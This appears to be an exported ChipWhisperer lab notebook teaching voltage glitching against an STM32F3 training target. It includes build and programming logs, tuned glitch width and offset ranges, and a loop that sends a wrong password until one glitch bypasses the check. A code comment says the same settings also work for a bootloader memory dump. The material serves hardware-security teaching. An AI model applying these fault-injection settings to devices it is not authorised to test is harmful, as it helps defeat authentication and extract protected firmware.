# %% [markdown]
# # Part 2, Topic 2: Voltage Glitching to Bypass Password

# %% [markdown]
# ---
# NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.
#
# ---

# %% [markdown]
# **SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations, just like clock glitching. Let's continue on and see if it can also be used to break past a password check.*
#
# **LEARNING OUTCOMES:**
#
# * Applying previous glitch settings to new firmware
# * Checking for success and failure when glitching

# %% [markdown]
# ## Firmware
#
# Again, we've already covered this lab, so it'll be mostly up to you!

# %%
SCOPETYPE = 'OPENADC'
PLATFORM = 'CW308_STM32F3'
SS_VER = 'SS_VER_2_1'

# %%
# %run "../../Setup_Scripts/Setup_Generic.ipynb"
# Out:
# (ChipWhisperer NAEUSB WARNING|File naeusb.py:826) Your firmware (0.64.0) is outdated - latest is 0.65.0 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information
# INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.
# INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.
# INFO: Found ChipWhisperer😍
# scope.gain.mode                          changed from low                       to high
# scope.gain.gain                          changed from 0                         to 30
# scope.gain.db                            changed from 5.5                       to 24.8359375
# scope.adc.basic_mode                     changed from low                       to rising_edge
# scope.adc.samples                        changed from 24400                     to 5000
# scope.adc.trig_count                     changed from 12904531                  to 35704196
# scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4
# scope.clock.adc_freq                     changed from 0                         to 29538471
# scope.clock.adc_rate                     changed from 0.0                       to 29538471.0
# scope.clock.clkgen_div                   changed from 1                         to 26
# scope.clock.clkgen_freq                  changed from 192000000.0               to 7384615.384615385
# scope.io.tio1                            changed from serial_tx                 to serial_rx
# scope.io.tio2                            changed from serial_rx                 to serial_tx
# scope.io.hs2                             changed from None                      to clkgen
# scope.io.cdc_settings                    changed from bytearray(b'\x01\x00\x00\x00') to bytearray(b'\x00\x00\x00\x00')

# %%
# %%bash -s "$PLATFORM" "$SS_VER"
# cd ../../../firmware/mcu/simpleserial-glitch
# make clean PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j
# Out:
# SS_VER set to SS_VER_2_1
# SS_VER set to SS_VER_2_1
# rm -f -- simpleserial-glitch-CW308_CC2538.hex simpleserial-glitch-CW301_AVR.hex simpleserial-glitch-CW303.hex simpleserial-glitch-CW304.hex simpleserial-glitch-CW308_MEGARF.hex simpleserial-glitch-CW308_SAM4L.hex simpleserial-glitch-CW308_STM32F0.hex simpleserial-glitch-CW308_STM32F1.hex simpleserial-glitch-CW308_STM32F2.hex simpleserial-glitch-CW308_STM32F3.hex simpleserial-glitch-CW308_STM32F4.hex simpleserial-glitch-CW308_K24F.hex simpleserial-glitch-CW308_NRF52.hex simpleserial-glitch-CW308_AURIX.hex simpleserial-glitch-CW308_SAML11.hex simpleserial-glitch-CW308_EFM32TG11B.hex simpleserial-glitch-CWLITEARM.hex simpleserial-glitch-CWLITEXMEGA.hex simpleserial-glitch-CWNANO.hex simpleserial-glitch-CW308_K82F.hex simpleserial-glitch-CW308_PSOC62.hex simpleserial-glitch-CW308_IMXRT1062.hex simpleserial-glitch-CW308_FE310.hex simpleserial-glitch-CW308_EFR32MG21A.hex simpleserial-glitch-CW308_EFM32GG11.hex simpleserial-glitch-CW308_STM32L5.hex simpleserial-glitch-CW308_NEORV32.hex simpleserial-glitch-CW308_SAM4S.hex simpleserial-glitch-CW305_IBEX.hex
# rm -rf .dep
# .
# rm -f -- simpleserial-glitch-CW308_CC2538.eep simpleserial-glitch-CW301_AVR.eep simpleserial-glitch-CW303.eep simpleserial-glitch-CW304.eep simpleserial-glitch-CW308_MEGARF.eep simpleserial-glitch-CW308_SAM4L.eep simpleserial-glitch-CW308_STM32F0.eep simpleserial-glitch-CW308_STM32F1.eep simpleserial-glitch-CW308_STM32F2.eep simpleserial-glitch-CW308_STM32F3.eep simpleserial-glitch-CW308_STM32F4.eep simpleserial-glitch-CW308_K24F.eep simpleserial-glitch-CW308_NRF52.eep simpleserial-glitch-CW308_AURIX.eep simpleserial-glitch-CW308_SAML11.eep simpleserial-glitch-CW308_EFM32TG11B.eep simpleserial-glitch-CWLITEARM.eep simpleserial-glitch-CWLITEXMEGA.eep simpleserial-glitch-CWNANO.eep simpleserial-glitch-CW308_K82F.eep simpleserial-glitch-CW308_PSOC62.eep simpleserial-glitch-CW308_IMXRT1062.eep simpleserial-glitch-CW308_FE310.eep simpleserial-glitch-CW308_EFR32MG21A.eep simpleserial-glitch-CW308_EFM32GG11.eep simpleserial-glitch-CW308_STM32L5.eep simpleserial-glitch-CW308_NEORV32.eep simpleserial-glitch-CW308_SAM4S.eep simpleserial-glitch-CW305_IBEX.eep
# rm -f -- simpleserial-glitch-CW308_CC2538.lss simpleserial-glitch-CW301_AVR.lss simpleserial-glitch-CW303.lss simpleserial-glitch-CW304.lss simpleserial-glitch-CW308_MEGARF.lss simpleserial-glitch-CW308_SAM4L.lss simpleserial-glitch-CW308_STM32F0.lss simpleserial-glitch-CW308_STM32F1.lss simpleserial-glitch-CW308_STM32F2.lss simpleserial-glitch-CW308_STM32F3.lss simpleserial-glitch-CW308_STM32F4.lss simpleserial-glitch-CW308_K24F.lss simpleserial-glitch-CW308_NRF52.lss simpleserial-glitch-CW308_AURIX.lss simpleserial-glitch-CW308_SAML11.lss simpleserial-glitch-CW308_EFM32TG11B.lss simpleserial-glitch-CWLITEARM.lss simpleserial-glitch-CWLITEXMEGA.lss simpleserial-glitch-CWNANO.lss simpleserial-glitch-CW308_K82F.lss simpleserial-glitch-CW308_PSOC62.lss simpleserial-glitch-CW308_IMXRT1062.lss simpleserial-glitch-CW308_FE310.lss simpleserial-glitch-CW308_EFR32MG21A.lss simpleserial-glitch-CW308_EFM32GG11.lss simpleserial-glitch-CW308_STM32L5.lss simpleserial-glitch-CW308_NEORV32.lss simpleserial-glitch-CW308_SAM4S.lss simpleserial-glitch-CW305_IBEX.lss
# rm -f -- objdir-CW308_STM32F3/*.o
# rm -f -- objdir-CW308_STM32F3/*.lst
# rm -rf objdir-CW308_STM32F3
# rm -f -- simpleserial-glitch.s simpleserial.s hal.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s simpleserial.s
# rm -f -- simpleserial-glitch.d simpleserial.d hal.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d simpleserial.d
# rm -f -- simpleserial-glitch.i simpleserial.i hal.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i simpleserial.i
# mkdir -p objdir-CW308_STM32F3
# .
# Welcome to another exciting ChipWhisperer target build!!
# .
# .
# .
# .
# .
# Compiling:
# .
# Compiling:
# Compiling:
# .
# Compiling:
# Compiling:
# Compiling:
# -en     simpleserial-glitch.c ...
# -en     .././simpleserial/simpleserial.c ...
# -en     .././hal/hal.c ...
# -en     .././hal//stm32f3/stm32f3_hal.c ...
# Assembling: .././hal//stm32f3/stm32f3_startup.S
# -en     .././hal//stm32f3/stm32f3_hal_lowlevel.c ...
# arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CW308_STM32F3/stm32f3_startup.lst -I.././simpleserial/ -I.././hal/ -I.././hal/ -I.././hal//stm32f3 -I.././hal//stm32f3/CMSIS -I.././hal//stm32f3/CMSIS/core -I.././hal//stm32f3/CMSIS/device -I.././hal//stm32f4/Legacy -I.././simpleserial/ -I.././crypto/ .././hal//stm32f3/stm32f3_startup.S -o objdir-CW308_STM32F3/stm32f3_startup.o
# -en     .././hal//stm32f3/stm32f3_sysmem.c ...
# -e Done!
# -e Done!
# -e Done!
# -e Done!
# -e Done!
# -e Done!
# .
# LINKING:
# -en     simpleserial-glitch-CW308_STM32F3.elf ...
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-closer.o): in function `_close_r':
# /build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/closer.c:47:(.text+0xc): warning: _close is not implemented and will always fail
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-lseekr.o): in function `_lseek_r':
# /build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/lseekr.c:49:(.text+0x14): warning: _lseek is not implemented and will always fail
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-readr.o): in function `_read_r':
# /build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/readr.c:49:(.text+0x14): warning: _read is not implemented and will always fail
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-closer.o): note: the message above does not take linker garbage collection into account
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-lseekr.o): note: the message above does not take linker garbage collection into account
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-readr.o): note: the message above does not take linker garbage collection into account
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-writer.o): in function `_write_r':
# /build/newlib-Ipb6mw/newlib-4.6.0.20260123/build_nano/arm-none-eabi/thumb/v7e-m/nofp/newlib/../../../../../../newlib/libc/reent/writer.c:49:(.text+0x14): warning: _write is not implemented and will always fail
# /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/bin/ld: /usr/lib/gcc/arm-none-eabi/14.2.1/../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg_nano.a(libc_a-writer.o): note: the message above does not take linker garbage collection into account
# -e Done!
# .
# .
# .
# .
# .
# Creating load file for Flash: simpleserial-glitch-CW308_STM32F3.hex
# arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.hex
# Creating load file for EEPROM: simpleserial-glitch-CW308_STM32F3.eep
# Creating Symbol Table: simpleserial-glitch-CW308_STM32F3.sym
# arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
# --change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.eep || exit 0
# Creating Extended Listing: simpleserial-glitch-CW308_STM32F3.lss
# Creating load file for Flash: simpleserial-glitch-CW308_STM32F3.bin
# arm-none-eabi-nm -n simpleserial-glitch-CW308_STM32F3.elf > simpleserial-glitch-CW308_STM32F3.sym
# arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CW308_STM32F3.elf simpleserial-glitch-CW308_STM32F3.bin
# arm-none-eabi-objdump -h -S -z simpleserial-glitch-CW308_STM32F3.elf > simpleserial-glitch-CW308_STM32F3.lss
# Size after:
#    text	   data	    bss	    dec	    hex	filename
#    5248	      8	   1368	   6624	   19e0	simpleserial-glitch-CW308_STM32F3.elf
# +--------------------------------------------------------
# + Default target does full rebuild each time.
# + Specify buildtarget == allquick == to avoid full rebuild
# +--------------------------------------------------------
# +--------------------------------------------------------
# + Built for platform CW308T: STM32F3 Target with:
# + CRYPTO_TARGET = NONE
# + CRYPTO_OPTIONS =
# +--------------------------------------------------------

# %%
fw_path = "../../../firmware/mcu/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
if SS_VER=="SS_VER_2_1":
    target.reset_comms()
# Out:
# Detected unknown STM32F ID: 0x446
# Extended erase (0x44), this can take ten seconds or more
# Attempting to program 5255 bytes at 0x8000000
# STM32F Programming flash...
# STM32F Reading flash...
# Verified flash OK, 5255 bytes

# %%
import time

def reboot_flush():
    reset_target(scope)
    target.flush()
if PLATFORM == "CWLITEXMEGA":
    scope.clock.clkgen_freq = 32E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*32/7.37
    else:
        target.baud = 38400*32/7.37
elif (PLATFORM == "CWLITEARM"):
    scope.clock.clkgen_freq = 24E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*24/7.37
    else:
        target.baud = 38400*24/7.37
elif (PLATFORM=="CW308_STM32F3"):
    scope.clock.clkgen_freq=24E6
    target.baud = int(230400*24/7.37)
    time.sleep(0.1)

print(scope.clock.clkgen_freq,target.baud)
# Out:
# 24000000.0 750284

# %%
#Do glitch loop
reboot_flush()
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
target.simpleserial_write('p', pw)

val = target.simpleserial_read_witherrors('r', 4, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)
# Out:
# (ChipWhisperer Target ERROR|File SimpleSerial2.py:191) CWbytearray(b'00 72 01 01 d4 00 03 65 01'), 5, 0
# (ChipWhisperer Target WARNING|File SimpleSerial2.py:414) Unexpected length 1, 4
# {'valid': False, 'payload': None, 'full_response': '\x00r\x01\x01Ô\x00\x03e\x01\x02ë\x00', 'rv': None}

# %% [markdown]
# Like with clock glitching, the scope object can set some typical glitch settings for you, with the additional requirement of specifying the transistor to use for glitching (`'both'`, `'lp'`, and `'hp'`):

# %%
if scope._is_husky:
    scope.vglitch_setup('hp', default_setup=False)
else:
    scope.vglitch_setup('both', default_setup=False) # use both transistors

# scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch
# scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
# scope.io.glitch_hp = True
# scope.io.glitch_lp = True

print(scope)
# Out:
# cwlite Device
# sn         = 50203220594a48303130373135313030
# fw_version =
#     major = 0
#     minor = 64
#     debug = 0
# gain =
#     mode = high
#     gain = 30
#     db   = 24.8359375
# adc =
#     state          = False
#     basic_mode     = rising_edge
#     timeout        = 2
#     offset         = 0
#     presamples     = 0
#     samples        = 5000
#     decimate       = 1
#     trig_count     = 35704432
#     fifo_fill_mode = normal
# clock =
#     adc_src       = clkgen_x4
#     adc_phase     = 0
#     adc_freq      = 96000000
#     adc_rate      = 96000000.0
#     adc_locked    = True
#     freq_ctr      = 0
#     freq_ctr_src  = extclk
#     clkgen_src    = system
#     extclk_freq   = 10000000
#     clkgen_mul    = 2
#     clkgen_div    = 8
#     clkgen_freq   = 24000000.0
#     clkgen_locked = True
# trigger =
#     triggers = tio4
#     module   = basic
# io =
#     tio1         = serial_rx
#     tio2         = serial_tx
#     tio3         = high_z
#     tio4         = high_z
#     pdid         = high_z
#     pdic         = high_z
#     nrst         = high_z
#     glitch_hp    = True
#     glitch_lp    = True
#     extclk_src   = hs1
#     hs2          = clkgen
#     target_pwr   = True
#     tio_states   = (1, 1, 0, 0)
#     cdc_settings = bytearray(b'\x00\x00\x00\x00')
# glitch =
#     clk_src     = clkgen
#     mmcm_locked = True
#     width       = 10.15625
#     width_fine  = 0
#     offset      = 10.15625
#     offset_fine = 0
#     trigger_src = ext_single
#     arm_timing  = after_scope
#     ext_offset  = 0
#     repeat      = 1
#     output      = glitch_only

# %%
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()
# Out:
# IntText(value=0, description='success count:', disabled=True)
# IntText(value=0, description='reset count:', disabled=True)
# IntText(value=0, description='normal count:', disabled=True)
# FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…
# FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…
# FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

# %%
gc.glitch_plot(plotdots={"success":"og", "reset":"xr", "normal":None})
# Out:
# <script type="esms-options">{"shimMode": true}</script><style>*[data-root-id],
# *[data-root-id] > * {
#   box-sizing: border-box;
#   font-family: var(--jp-ui-font-family);
#   font-size: var(--jp-ui-font-size1);
#   color: var(--vscode-editor-foreground, var(--jp-ui-font-color1));
# }
#
# /* Override VSCode background color */
# .cell-output-ipywidget-background:has(
#     > .cell-output-ipywidget-background > .lm-Widget > *[data-root-id]
#   ),
# .cell-output-ipywidget-background:has(> .lm-Widget > *[data-root-id]) {
#   background-color: transparent !important;
# }
# </style>
# <div id='c910a63f-5454-4bf2-acf0-2f5da5b01340'>
#   <div id="eb9f1f34-848c-4ab5-a6fb-df83e195e3ec" data-root-id="c910a63f-5454-4bf2-acf0-2f5da5b01340" style="display: contents;"></div>
# </div>
# <script type="application/javascript">(function(root) {
#   var docs_json = {"b6495c7c-a176-473c-8ebd-57bc687cf330":{"version":"3.6.3","title":"Bokeh Application","roots":[{"type":"object","name":"panel.models.browser.BrowserInfo","id":"c910a63f-5454-4bf2-acf0-2f5da5b01340"},{"type":"object","name":"panel.models.comm_manager.CommManager","id":"550cbb1e-c32c-43be-8cab-9fd74872c701","attributes":{"plot_id":"c910a63f-5454-4bf2-acf0-2f5da5b01340","comm_id":"d71cea185165459c82c23337087f05c8","client_comm_id":"e5d1c703013a4bdb9a765473ef74e703"}}],"defs":[{"type":"model","name":"ReactiveHTML1"},{"type":"model","name":"FlexBox1","properties":[{"name":"align_content","kind":"Any","default":"flex-start"},{"name":"align_items","kind":"Any","default":"flex-start"},{"name":"flex_direction","kind":"Any","default":"row"},{"name":"flex_wrap","kind":"Any","default":"wrap"},{"name":"gap","kind":"Any","default":""},{"name":"justify_content","kind":"Any","default":"flex-start"}]},{"type":"model","name":"FloatPanel1","properties":[{"name":"config","kind":"Any","default":{"type":"map"}},{"name":"contained","kind":"Any","default":true},{"name":"position","kind":"Any","default":"right-top"},{"name":"offsetx","kind":"Any","default":null},{"name":"offsety","kind":"Any","default":null},{"name":"theme","kind":"Any","default":"primary"},{"name":"status","kind":"Any","default":"normalized"}]},{"type":"model","name":"GridStack1","properties":[{"name":"mode","kind":"Any","default":"warn"},{"name":"ncols","kind":"Any","default":null},{"name":"nrows","kind":"Any","default":null},{"name":"allow_resize","kind":"Any","default":true},{"name":"allow_drag","kind":"Any","default":true},{"name":"state","kind":"Any","default":[]}]},{"type":"model","name":"drag1","properties":[{"name":"slider_width","kind":"Any","default":5},{"name":"slider_color","kind":"Any","default":"black"},{"name":"value","kind":"Any","default":50}]},{"type":"model","name":"click1","properties":[{"name":"terminal_output","kind":"Any","default":""},{"name":"debug_name","kind":"Any","default":""},{"name":"clears","kind":"Any","default":0}]},{"type":"model","name":"FastWrapper1","properties":[{"name":"object","kind":"Any","default":null},{"name":"style","kind":"Any","default":null}]},{"type":"model","name":"NotificationAreaBase1","properties":[{"name":"js_events","kind":"Any","default":{"type":"map"}},{"name":"position","kind":"Any","default":"bottom-right"},{"name":"_clear","kind":"Any","default":0}]},{"type":"model","name":"NotificationArea1","properties":[{"name":"js_events","kind":"Any","default":{"type":"map"}},{"name":"notifications","kind":"Any","default":[]},{"name":"position","kind":"Any","default":"bottom-right"},{"name":"_clear","kind":"Any","default":0},{"name":"types","kind":"Any","default":[{"type":"map","entries":[["type","warning"],["background","#ffc107"],["icon",{"type":"map","entries":[["className","fas fa-exclamation-triangle"],["tagName","i"],["color","white"]]}]]},{"type":"map","entries":[["type","info"],["background","#007bff"],["icon",{"type":"map","entries":[["className","fas fa-info-circle"],["tagName","i"],["color","white"]]}]]}]}]},{"type":"model","name":"Notification","properties":[{"name":"background","kind":"Any","default":null},{"name":"duration","kind":"Any","default":3000},{"name":"icon","kind":"Any","default":null},{"name":"message","kind":"Any","default":""},{"name":"notification_type","kind":"Any","default":null},{"name":"_rendered","kind":"Any","default":false},{"name":"_destroyed","kind":"Any","default":false}]},{"type":"model","name":"TemplateActions1","properties":[{"name":"open_modal","kind":"Any","default":0},{"name":"close_modal","kind":"Any","default":0}]},{"type":"model","name":"BootstrapTemplateActions1","properties":[{"name":"open_modal","kind":"Any","default":0},{"name":"close_modal","kind":"Any","default":0}]},{"type":"model","name":"TemplateEditor1","properties":[{"name":"layout","kind":"Any","default":[]}]},{"type":"model","name":"MaterialTemplateActions1","properties":[{"name":"open_modal","kind":"Any","d ...
#   var render_items = [{"docid":"b6495c7c-a176-473c-8ebd-57bc687cf330","roots":{"c910a63f-5454-4bf2-acf0-2f5da5b01340":"eb9f1f34-848c-4ab5-a6fb-df83e195e3ec"},"root_ids":["c910a63f-5454-4bf2-acf0-2f5da5b01340"]}];
#   var docs = Object.values(docs_json)
#   if (!docs) {
#     return
#   }
#   const py_version = docs[0].version.replace('rc', '-rc.').replace('.dev', '-dev.')
#   async function embed_document(root) {
#     var Bokeh = get_bokeh(root)
#     await Bokeh.embed.embed_items_notebook(docs_json, render_items);
#     for (const render_item of render_items) {
#       for (const root_id of render_item.root_ids) {
# 	const id_el = document.getElementById(root_id)
# 	if (id_el.children.length && id_el.children[0].hasAttribute('data-root-id')) {
# 	  const root_el = id_el.children[0]
# 	  root_el.id = root_el.id + '-rendered'
# 	  for (const child of root_el.children) {
#             // Ensure JupyterLab does not capture keyboard shortcuts
#             // see: https://jupyterlab.readthedocs.io/en/4.1.x/extension/notebook.html#keyboard-interaction-model
# 	    child.setAttribute('data-lm-suppress-shortcuts', 'true')
# 	  }
# 	}
#       }
#     }
#   }
#   function get_bokeh(root) {
#     if (root.Bokeh === undefined) {
#       return null
#     } else if (root.Bokeh.version !== py_version) {
#       if (root.Bokeh.versions === undefined || !root.Bokeh.versions.has(py_version)) {
# 	return null
#       }
#       return root.Bokeh.versions.get(py_version);
#     } else if (root.Bokeh.version === py_version) {
#       return root.Bokeh
#     }
#     return null
#   }
#   function is_loaded(root) {
#     var Bokeh = get_bokeh(root)
#     return (Bokeh != null && Bokeh.Panel !== undefined)
#   }
#   if (is_loaded(root)) {
#     embed_document(root);
#   } else {
#     var attempts = 0;
#     var timer = setInterval(function(root) {
#       if (is_loaded(root)) {
#         clearInterval(timer);
#         embed_document(root);
#       } else if (document.readyState == "complete") {
#         attempts++;
#         if (attempts > 200) {
#           clearInterval(timer);
# 	  var Bokeh = get_bokeh(root)
# 	  if (Bokeh == null || Bokeh.Panel == null) {
#             console.warn("Panel: ERROR: Unable to run Panel code because Bokeh or Panel library is missing");
# 	  } else {
# 	    console.warn("Panel: WARNING: Attempting to render but not all required libraries could be resolved.")
# 	    embed_document(root)
# 	  }
#         }
#       }
#     }, 25, root)
#   }
# })(window);</script>
# Parameter name clashes for keys ['data']</br>
# :DynamicMap   []
#    :Overlay
#       .Points.I  :Points   [width,offset]
#       .Points.II :Points   [width,offset]

# %%
gc.set_range("ext_offset", 0, 40)
gc.set_global_step(1)
if scope._is_husky:
    gc.set_range("width", 1900, 1901)
    gc.set_range("offset", 2000, 2500)
    gc.set_global_step([50])
    gc.set_step("ext_offset", 1)
else:
    if PLATFORM=="CWLITEXMEGA":
        gc.set_range("width", 43.5, 47.8)
        gc.set_range("offset", -48, -10)
        #gc.set_range("ext_offset", 7, 10)
        gc.set_range("ext_offset", 30, 45)
        scope.glitch.repeat = 11
    elif PLATFORM == "CWLITEARM":
        #should also work for the bootloader memory dump
        gc.set_range("width", 30.7, 36)
        gc.set_range("offset", -40, -35)
        scope.glitch.repeat = 7
    elif PLATFORM == "CW308_STM32F3":
        #these specific settings seem to work well for some reason
        #also works for the bootloader memory dump
        gc.set_range("ext_offset", 4, 31)
        gc.set_range("width", 47.6, 49.6)
        gc.set_range("offset", -19, -21.5)
        gc.set_step("width",0.4)
        gc.set_step("offset",0.4)
        scope.glitch.repeat = 5 # was 5 before

# %%
#disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)

scope.adc.timeout = 0.1
successes = 0

reboot_flush()

for glitch_settings in gc.glitch_values():
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.width = glitch_settings[0]
    scope.glitch.ext_offset = glitch_settings[2]
    if scope.adc.state:
        # can detect crash here (fast) before timing out (slow)
        #print("Trigger still high!")
        gc.add("reset")
        reboot_flush()

    scope.arm()
    target.simpleserial_write('p', bytearray([0]*5)) #random wrong password
    ret = scope.capture()
    scope.io.vglitch_reset()
    
    if ret:
        print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check
        if val['valid'] is False:
            gc.add("reset")
            print("actual reset")
        else:
            if val['payload'] == bytearray([1]): #for loop check
                successes +=1 
                gc.add("success")
                print(val)
                print(val['payload'])
                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                print("🐙", end="")
            else:
                gc.add("normal")
                    
#reenable logging
cw.set_all_log_levels(cw.logging.WARNING)
# Out:
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
# CWbytearray(b'01')
# 48.828125 -20.703125 28
# 🐙actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
# actual reset
